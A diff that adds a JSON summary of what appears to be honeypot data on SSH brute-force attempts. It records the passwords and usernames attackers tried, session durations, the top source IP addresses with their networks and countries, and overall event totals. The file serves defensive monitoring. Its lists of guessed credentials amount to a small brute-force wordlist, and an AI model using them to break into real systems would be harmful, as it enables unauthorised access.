+   "password": "P@ssw0rd",
+   "source_addresses": 23
+  },
+  {
+   "attempts": 100,
+   "password": "Aa123456",
+   "source_addresses": 21
+  },
+  {
+   "attempts": 99,
+   "password": "qwerty",
+   "source_addresses": 22
+  }
+ ],
+ "session_seconds": {
+  "instant": 109,
+  "longest": 356.639,
+  "median": 1.253,
+  "p90": 6.544
+ },
+ "top_addresses": [
+  {
+   "address": "206.123.140.188",
+   "as_org": "LLC Rusbuilding",
+   "asn": 199458,
+   "commands": 2388,
+   "country": "Germany",
+   "country_code": "DE",
+   "events": 19109,
+   "first_seen": "2026-09-14 20:36:46.038325",
+   "last_seen": "2026-09-15 18:23:39.660772",
+   "sessions": 2389,
+   "usernames_tried": 3
+  },
+  {
+   "address": "109.160.32.100",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1432,
+   "country": "United States",
+   "country_code": "US",
+   "events": 11480,
+   "first_seen": "2026-09-16 21:25:59.139384",
+   "last_seen": "2026-09-16 23:30:11.174300",
+   "sessions": 1437,
+   "usernames_tried": 343
+  },
+  {
+   "address": "109.160.32.115",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1432,
+   "country": "United States",
+   "country_code": "US",
+   "events": 11480,
+   "first_seen": "2026-09-16 15:37:55.679833",
+   "last_seen": "2026-09-16 18:13:18.560462",
+   "sessions": 1437,
+   "usernames_tried": 343
+  },
+  {
+   "address": "109.160.32.117",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1432,
+   "country": "United States",
+   "country_code": "US",
+   "events": 11480,
+   "first_seen": "2026-09-18 19:05:53.551306",
+   "last_seen": "2026-09-18 20:50:27.212804",
+   "sessions": 1437,
+   "usernames_tried": 343
+  },
+  {
+   "address": "109.160.32.120",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1432,
+   "country": "United States",
+   "country_code": "US",
+   "events": 11480,
+   "first_seen": "2026-09-16 17:09:56.555752",
+   "last_seen": "2026-09-16 19:15:34.071301",
+   "sessions": 1437,
+   "usernames_tried": 343
+  },
+  {
+   "address": "109.160.32.19",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1432,
+   "country": "United States",
+   "country_code": "US",
+   "events": 11480,
+   "first_seen": "2026-09-15 19:07:32.704212",
+   "last_seen": "2026-09-15 21:18:26.477860",
+   "sessions": 1437,
+   "usernames_tried": 343
+  },
+  {
+   "address": "109.160.32.23",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1432,
+   "country": "United States",
+   "country_code": "US",
+   "events": 11480,
+   "first_seen": "2026-09-18 14:31:20.372006",
+   "last_seen": "2026-09-18 17:26:39.502875",
+   "sessions": 1437,
+   "usernames_tried": 343
+  },
+  {
+   "address": "109.160.32.34",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1432,
+   "country": "United States",
+   "country_code": "US",
+   "events": 11480,
+   "first_seen": "2026-09-15 13:14:38.707964",
+   "last_seen": "2026-09-15 15:19:59.990683",
+   "sessions": 1437,
+   "usernames_tried": 343
+  },
+  {
+   "address": "109.160.32.35",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1432,
+   "country": "United States",
+   "country_code": "US",
+   "events": 11480,
+   "first_seen": "2026-09-16 22:37:11.348317",
+   "last_seen": "2026-09-17 00:32:13.465151",
+   "sessions": 1437,
+   "usernames_tried": 343
+  },
+  {
+   "address": "109.160.32.43",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1432,
+   "country": "United States",
+   "country_code": "US",
+   "events": 11480,
+   "first_seen": "2026-09-15 23:31:19.041203",
+   "last_seen": "2026-09-16 01:24:44.374660",
+   "sessions": 1437,
+   "usernames_tried": 343
+  },
+  {
+   "address": "109.160.32.61",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1432,
+   "country": "United States",
+   "country_code": "US",
+   "events": 11480,
+   "first_seen": "2026-09-17 05:37:28.709460",
+   "last_seen": "2026-09-17 07:42:04.674360",
+   "sessions": 1437,
+   "usernames_tried": 343
+  },
+  {
+   "address": "109.160.32.67",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1432,
+   "country": "United States",
+   "country_code": "US",
+   "events": 11480,
+   "first_seen": "2026-09-14 22:21:57.216459",
+   "last_seen": "2026-09-15 00:14:20.837972",
+   "sessions": 1437,
+   "usernames_tried": 343
+  },
+  {
+   "address": "109.160.32.79",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1432,
+   "country": "United States",
+   "country_code": "US",
+   "events": 11480,
+   "first_seen": "2026-09-15 15:03:47.702920",
+   "last_seen": "2026-09-15 16:55:20.500119",
+   "sessions": 1437,
+   "usernames_tried": 343
+  },
+  {
+   "address": "109.160.32.85",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1432,
+   "country": "United States",
+   "country_code": "US",
+   "events": 11480,
+   "first_seen": "2026-09-15 19:20:19.455544",
+   "last_seen": "2026-09-15 21:27:30.042161",
+   "sessions": 1437,
+   "usernames_tried": 343
+  },
+  {
+   "address": "109.160.32.66",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1431,
+   "country": "United States",
+   "country_code": "US",
+   "events": 11472,
+   "first_seen": "2026-09-17 17:19:06.240368",
+   "last_seen": "2026-09-17 19:54:02.761476",
+   "sessions": 1436,
+   "usernames_tried": 343
+  },
+  {
+   "address": "109.160.32.62",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1430,
+   "country": "United States",
+   "country_code": "US",
+   "events": 11464,
+   "first_seen": "2026-09-18 16:29:40.485212",
+   "last_seen": "2026-09-18 18:58:49.530418",
+   "sessions": 1435,
+   "usernames_tried": 342
+  },
+  {
+   "address": "74.121.190.250",
+   "as_org": "Wowrack.com",
+   "asn": 27323,
+   "commands": 575,
+   "country": "United States",
+   "country_code": "US",
+   "events": 4605,
+   "first_seen": "2026-09-15 05:46:25.590820",
+   "last_seen": "2026-09-15 11:32:45.094444",
+   "sessions": 576,
+   "usernames_tried": 2
+  },
+  {
+   "address": "128.14.232.186",
+   "as_org": "UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED",
+   "asn": 135377,
+   "commands": 379,
+   "country": "Indonesia",
+   "country_code": "ID",
+   "events": 3046,
+   "first_seen": "2026-09-18 02:14:32.791615",
+   "last_seen": "2026-09-18 02:19:58.945961",
+   "sessions": 382,
+   "usernames_tried": 182
+  },
+  {
+   "address": "47.80.13.176",
+   "as_org": "Alibaba (US) Technology Co., Ltd.",
+   "asn": 45102,
+   "commands": 379,
+   "country": "South Korea",
+   "country_code": "KR",
+   "events": 3046,
+   "first_seen": "2026-09-14 08:57:28.594024",
+   "last_seen": "2026-09-14 09:07:53.900291",
+   "sessions": 382,
+   "usernames_tried": 182
+  },
+  {
+   "address": "157.10.198.167",
+   "as_org": "VIET DIGITAL TECHNOLOGY LIABILITY COMPANY",
+   "asn": 135918,
+   "commands": 373,
+   "country": "Vietnam",
+   "country_code": "VN",
+   "events": 2984,
+   "first_seen": "2026-09-14 20:47:28.694682",
+   "last_seen": "2026-09-15 14:50:04.854540",
+   "sessions": 373,
+   "usernames_tried": 1
+  }
+ ],
+ "totals": {
+  "asns": 162,
+  "countries": 55,
+  "events": 219800,
+  "first_event": "2026-09-14 07:31:15.476681",
+  "last_event": "2026-09-19 00:36:14.403568",
+  "sessions": 28055,
+  "source_addresses": 415
+ },
+ "usernames": [
+  {
+   "attempts": 10423,
+   "source_addresses": 65,
+   "username": "root"
+  },
+  {
+   "attempts": 2221,
+   "source_addresses": 28,
+   "username": "ubuntu"
+  },
+  {
+   "attempts": 949,
+   "source_addresses": 55,
+   "username": "admin"
+  },
+  {
+   "attempts": 630,
+   "source_addresses": 29,
+   "username": "user"
+  },
+  {
+   "attempts": 533,
+   "source_addresses": 22,
+   "username": "deploy"
+  },
+  {
+   "attempts": 419,
+   "source_addresses": 25,
+   "username": "test"
+  },
+  {
+   "attempts": 232,
+   "source_addresses": 20,
+   "username": "claude"
+  },
+  {
+   "attempts": 225,
+   "source_addresses": 21,
+   "username": "user1"
+  },
+  {
+   "attempts": 192,
+   "source_addresses": 21,
+   "username": "debian"
+  },
+  {
+   "attempts": 190,
+   "source_addresses": 19,
+   "username": "minecraft"
+  },
+  {
+   "attempts": 167,
+   "source_addresses": 20,
+   "username": "postgres"
+  },
+  {
+   "attempts": 163,
+   "source_addresses": 19,
+   "username": "ftpuser"
+  },
+  {
+   "attempts": 159,
+   "source_addresses": 18,
+   "username": "dev"
+  },
+  {
+   "attempts": 148,
+   "source_addresses": 21,
+   "username": "guest"
+  },
+  {
+   "attempts": 147,
+   "source_addresses": 20,
+   "username": "frappe"
+  },
+  {
+   "attempts": 142,
+   "source_addresses": 19,
+   "username": "developer"
+  },
+  {
+   "attempts": 142,
+   "source_addresses": 21,
+   "username": "oracle"
+  },
+  {
+   "attempts": 140,
+   "source_addresses": 18,
+   "username": "openclaw"
+  },
+  {
+   "attempts": 138,
+   "source_addresses": 22,
+   "username": "git"
+  },
+  {
+   "attempts": 131,
+   "source_addresses": 18,
+   "username": "steam"
+  }
+ ]
+}
